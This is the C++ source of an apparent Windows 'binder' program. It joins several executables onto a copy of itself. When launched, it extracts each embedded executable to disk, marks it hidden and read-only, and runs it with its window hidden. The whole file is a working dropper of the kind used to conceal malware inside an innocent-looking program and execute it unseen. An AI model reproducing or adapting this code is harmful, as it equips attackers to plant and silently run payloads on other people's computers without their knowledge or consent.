#undef UNICODE
#include <Windows.h>

#include <fstream>
#include <vector>
#include <string>
#include <chrono>

#define ExecuteAndHide(exe, hide) if (hide) SetFileAttributes(exe, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY); ShellExecute(nullptr, "open", exe, nullptr, nullptr, hide ? SW_HIDE : SW_NORMAL);

#define SEPARATOR "*****"
#define SEPARATOR_SIZE strlen(SEPARATOR)

void FindAllOccurrences(const std::string& data, const std::string& query, std::vector<size_t>& occurancesPoss) {
	size_t pos = data.find(query);
	while(pos != std::string::npos) {
		occurancesPoss.push_back(pos);
		pos = data.find(query, pos + query.size());
	}
}

inline void FileAsString(const std::string& file, std::string& str, const std::ios_base::openmode iosOM = std::ios::binary) {
	std::ifstream ifs(file, iosOM);
	str.assign((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
}

inline int64_t TSAsLL() {
	return std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
}

void Bind(const std::vector<std::string>& files, const std::string& fileBinded, const std::string& fileOpener) {
	std::ofstream ofs(fileBinded, std::ios::binary);
	ofs << std::ifstream(fileOpener, std::ios::binary).rdbuf() << SEPARATOR;

	size_t index = files.size();
	for(auto& file : files) {
		ofs << std::ifstream(file, std::ios::binary).rdbuf();

		if(--index) {
			ofs << SEPARATOR;
		}
	}
}

void Open(const std::string& file, const bool hide = true) {
	std::string data;
	FileAsString(file, data);

	std::vector<size_t> occurancesPoss;
	FindAllOccurrences(data, SEPARATOR, occurancesPoss);

	for(size_t i = 1; i < occurancesPoss.size() - 1; i++) {
		std::string exeName(std::to_string(TSAsLL()) + ".exe");

		size_t exeStart = occurancesPoss[i] + SEPARATOR_SIZE;
		std::ofstream(exeName, std::ios::binary) << data.substr(exeStart, occurancesPoss[i + 1] - exeStart);

		ExecuteAndHide(exeName.c_str(), hide);
	}

	std::string exeName(std::to_string(TSAsLL()) + ".exe");

	std::ofstream(exeName, std::ios::binary) << data.substr(occurancesPoss.back() + SEPARATOR_SIZE);

	ExecuteAndHide(exeName.c_str(), hide);
}

int main(int argc, char** argv) {
	if(argc > 1) {
		Bind(std::vector<std::string>(&argv[1], argv + argc - 1), argv[argc - 1], argv[0]);
	} else {
		Open(argv[0], true);
	}

	return EXIT_SUCCESS;
}
